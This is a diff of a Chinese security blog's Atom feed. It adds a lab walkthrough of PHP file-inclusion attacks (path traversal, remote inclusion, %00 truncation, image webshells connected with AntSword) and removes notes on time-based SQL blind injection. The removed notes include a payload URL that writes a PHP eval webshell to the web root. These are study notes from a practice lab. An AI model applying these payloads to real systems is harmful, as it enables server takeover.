@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-09-18T00:45:21.930Z</updated>
+  <updated>2019-09-18T23:54:07.974Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -18,10 +18,10 @@
   
   <entry>
     <title>Welcome</title>
-    <link href="http://yoursite.com/2019/09/18/welcome/"/>
-    <id>http://yoursite.com/2019/09/18/welcome/</id>
-    <published>2019-09-18T00:00:00.000Z</published>
-    <updated>2019-09-18T00:45:21.930Z</updated>
+    <link href="http://yoursite.com/2019/09/19/welcome/"/>
+    <id>http://yoursite.com/2019/09/19/welcome/</id>
+    <published>2019-09-19T00:00:00.000Z</published>
+    <updated>2019-09-18T23:54:07.974Z</updated>
     
     <content type="html"><![CDATA[<!-- excerpt -->]]></content>
     
@@ -32,6 +32,30 @@
     
     </summary>
     
+    
+  </entry>
+  
+  <entry>
+    <title>PHP 文件包含简单利用</title>
+    <link href="http://yoursite.com/2019/09/18/phpInclude/"/>
+    <id>http://yoursite.com/2019/09/18/phpInclude/</id>
+    <published>2019-09-18T08:34:23.000Z</published>
+    <updated>2019-09-18T23:57:08.670Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 文件包含简单应用</p><a id="more"></a><!--export--><!--toc--><h3 id="文件目录"><a href="#文件目录" class="headerlink" title="文件目录"></a>文件目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">action</span><br><span class="line">|    action.php</span><br><span class="line">|    action1.php</span><br><span class="line">|    action2.php</span><br><span class="line">|    action3.php</span><br><span class="line">|    index.php</span><br><span class="line">|    news.jpg</span><br><span class="line">|    readme.txt</span><br></pre></td></tr></table></figure><h3 id="服务器部署环境"><a href="#服务器部署环境" class="headerlink" title="服务器部署环境"></a>服务器部署环境</h3><p>打开首页，收集信息。</p><p><img src="/images/124action1.png" alt></p><h3 id="直接包含"><a href="#直接包含" class="headerlink" title="直接包含"></a>直接包含</h3><h4 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h4><p>点击 <code>php include</code>，进入第一关，源码已显示出来。</p><p><img src="/images/124action2.png" alt></p><p>程序未对输入参数 <code>action</code> 做任何处理，修改 <code>action=../../../../../../Windows/system.ini</code>，观察页面变化。</p><p><img src="/images/124action3.png" alt></p><p>可以看到已读取到 <code>system.ini</code>。返回首页查看图片地址，</p><p><img src="/images/124action4.png" alt></p><p>图片马和 <code>news.php</code> 在同一目录下。修改 <code>action</code> 的值，读取图片马。</p><p><img src="/images/124action5.png" alt></p><p>用蚁剑连接，连接成功。</p><p><img src="/images/124action6.png" alt></p><h4 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h4><p><strong>注意</strong>：需设置 <code>php.ini</code> 文件中 <code>allow_url_include=On</code>。</p><p>由源码可知，未对传入参数做任何处理所以可以使用远程包含。在自己搭建的服务器上存放一个图片马，修改 <code>action</code> 的值。</p><p><img src="/images/124action7.png" alt></p><p>尝试用蚁剑连接，</p><p><img src="/images/124action8.png" alt></p><h3 id="限制路径"><a href="#限制路径" class="headerlink" title="限制路径"></a>限制路径</h3><p>打开 <code>php include 1</code> </p><p><img src="/images/124action9.png" alt></p><p>可以看出来，对包含的文件做了限制路径的操作。这时远程文件包含无法使用。修改 <code>action</code> 的值。</p><p><img src="/images/124action10.png" alt></p><p>用蚁剑连接，</p><p><img src="/images/124action12.png" alt></p><h3 id="限制后缀"><a href="#限制后缀" class="headerlink" title="限制后缀"></a>限制后缀</h3><p>打开<code>php include 2</code>，</p><p><img src="/images/124action13.png" alt></p><h4 id="本地包含-1"><a href="#本地包含-1" class="headerlink" title="本地包含"></a>本地包含</h4><p><strong>注意</strong>：需要把 <code>magic_quote_gpc=Off</code></p><p>用  <code>burpsuite</code> 抓包，</p><p><img src="/images/124action14.png" alt></p><p>点击 <code>Forward</code>。</p><p><img src="/images/124action15.png" alt></p><p>查看本地文件，</p><p><img src="/images/124action16.png" alt></p><p>显示结果</p><p><img src="/images/124action17.png" alt></p><h4 id="远程包含-1"><a href="#远程包含-1" class="headerlink" title="远程包含"></a>远程包含</h4><p><img src="/images/124action18.png" alt></p><p>蚁剑连接</p><p><img src="/images/124action19.png" alt></p><h3 id="限制路径和限制后缀结合"><a href="#限制路径和限制后缀结合" class="headerlink" title="限制路径和限制后缀结合"></a>限制路径和限制后缀结合</h3><p>限制路径后无法使用远程包含</p><p>打开 <code>php include 3</code></p><p><img src="/images/124action20.png" alt></p><p>使用 <code>%00</code> 截断，</p><p><img src="/images/124action21.png" alt></p><p>显示 <code>news.jpg</code></p><p><img src="/images/124action22.png" alt></p><p>蚁剑连接</p><p><img src="/images/124action23.png" alt></p><h3 id="XP-系统文件路径长度截断"><a href="#XP-系统文件路径长度截断" class="headerlink" title="XP 系统文件路径长度截断"></a>XP 系统文件路径长度截断</h3><p><code>action2</code> 可以截断</p><p><img src="/images/124action24.png" alt></p><p><code>action3</code> 不能截断</p><p><img src="/images/124action25.png" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 文件包含简单应用&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
+    
+      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="文件包含漏洞" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
     
   </entry>
   
@@ -462,30 +486,6 @@
     <summary type="html">
     
       &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: SQLMap 的简单应用&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
-    
-      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
-    
-    
-      <category term="SQL 盲注" scheme="http://yoursite.com/tags/SQL-%E7%9B%B2%E6%B3%A8/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>笔记34</title>
-    <link href="http://yoursite.com/2019/08/29/note34/"/>
-    <id>http://yoursite.com/2019/08/29/note34/</id>
-    <published>2019-08-29T11:49:36.000Z</published>
-    <updated>2019-09-09T05:38:37.527Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>Abstract</strong>: SQL 盲注之时间盲注</p><a id="more"></a><!--export--><!--toc--><h3 id="SQL-盲注"><a href="#SQL-盲注" class="headerlink" title="SQL 盲注"></a>SQL 盲注</h3><h4 id="sleep-second-函数"><a href="#sleep-second-函数" class="headerlink" title="sleep(second) 函数"></a>sleep(second) 函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 系统睡眠3秒，查询结果为0</span><br><span class="line">select sleep(3);</span><br></pre></td></tr></table></figure><p>时间可以精确控制。</p><h4 id="benchmark-number-function-函数"><a href="#benchmark-number-function-函数" class="headerlink" title="benchmark(number, function)函数"></a>benchmark(number, function)函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 重复执行某个函数N次</span><br><span class="line">select benchmark(10000000, md5(1);</span><br></pre></td></tr></table></figure><p>时间不可控，电脑性能越高，时间越短。</p><table><thead><tr><th align="center">select * from table where id = 1</th><th align="center">and if(布尔表达式, 0, 1);</th></tr></thead><tbody><tr><td align="center">原始语句</td><td align="center">测试语句+注入语句</td></tr></tbody></table><p><em>参考文章</em></p><blockquote><p><a href="https://www.cnblogs.com/-qing-/p/10894310.html" target="_blank" rel="noopener">MySQL时间盲注五种延时方法 (PWNHUB 非预期解)</a></p></blockquote><h4 id="and-0-的短路特性"><a href="#and-0-的短路特性" class="headerlink" title="and 0 的短路特性"></a>and 0 的短路特性</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and 1 and sleep(1);</span><br><span class="line"># 1.00sec</span><br><span class="line">select * from users where id=1 and 0 and sleep(1);</span><br><span class="line"># 0.00 sec</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select 1 and sleep(3);</span><br><span class="line"># 3.00 sec</span><br><span class="line">select 0 and sleep(3);</span><br><span class="line"># 0.00 sec</span><br></pre></td></tr></table></figure><h4 id="or-1-的短路特性"><a href="#or-1-的短路特性" class="headerlink" title="or 1 的短路特性"></a>or 1 的短路特性</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 or 1 or sleep(1);</span><br><span class="line"># 0.00 sec</span><br><span class="line">select * from users where id=1 or 0 or sleep(1);</span><br><span class="line"># 1.00 sec</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select 1 or sleep(3);</span><br><span class="line"># 0.00 sec</span><br><span class="line">select 0 or sleep(3);</span><br><span class="line"># 3.00 sec</span><br></pre></td></tr></table></figure><h4 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h4><ul><li><code>if(布尔语句, 0, 1)</code></li></ul><p>条件成立取 0 ，条件不成立取 1 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 睡眠3秒</span><br><span class="line">select if(length(version())&gt;1, sleep(3), 0);</span><br><span class="line"># 直接返回0</span><br><span class="line">select if(length(version())&gt;15, sleep(3), 0);</span><br></pre></td></tr></table></figure><ul><li><code>case [1] when [2] then [3] else [4] end</code></li></ul><p>当 [1] 的值与 [2] 的值相等时，取 [3]，否则取 [4]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select case 1=1 when 1 then 123 else 456 end;</span><br><span class="line"># 123</span><br></pre></td></tr></table></figure><p><code>or</code> 的影响</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&apos;1&apos; or sleep(3); #&apos;;</span><br><span class="line"># 1 row in set (36.01 sec)</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：<code>sleep</code>是存在一个满足条件的行就会延迟指定的时间，比如 <code>sleep(5)</code>，但实际上查找到两个满足条件的行，那么就会延迟 10s ，在真实的渗透测试过程中，我们有时候不清楚整个表的情况，可以用 <code>sleep(0.001)</code>看最后多少秒有结果，推断表的行数。</p><p><em>参考文章</em></p><blockquote><p><a href="https://www.anquanke.com/post/id/170626" target="_blank" rel="noopener">一篇文章带你深入理解 SQL 盲注</a></p></blockquote><h4 id="用-SQL-注入写webshell"><a href="#用-SQL-注入写webshell" class="headerlink" title="用 SQL 注入写webshell"></a>用 SQL 注入写webshell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.197/Less-1/?id=1&apos; union select 1,2, &apos;&lt;?php @eval($_POST[&apos;pass&apos;])?&gt;&apos; into outfile &apos;/var/www/html/case.txt&apos; --+</span><br></pre></td></tr></table></figure><p>注意权限问题，此时创建文件的用户是 <code>mysql</code></p><h4 id="防止-SQL-注入常用函数"><a href="#防止-SQL-注入常用函数" class="headerlink" title="防止 SQL 注入常用函数"></a>防止 SQL 注入常用函数</h4><p><code>addslashes()</code>和 <code>mysql_real_escape_string()</code></p><p>详细内容请访问：</p><p><a href="https://meethanmj.github.io/2019/08/17/php-file-func/" target="_blank" rel="noopener">PHP内置过滤函数</a></p><h4 id="寻找-SQL-注入点思路"><a href="#寻找-SQL-注入点思路" class="headerlink" title="寻找 SQL 注入点思路"></a>寻找 SQL 注入点思路</h4><p><img src="/images/139sqlinjec.png" alt></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: SQL 盲注之时间盲注&lt;/p&gt;
     
     </summary>
     
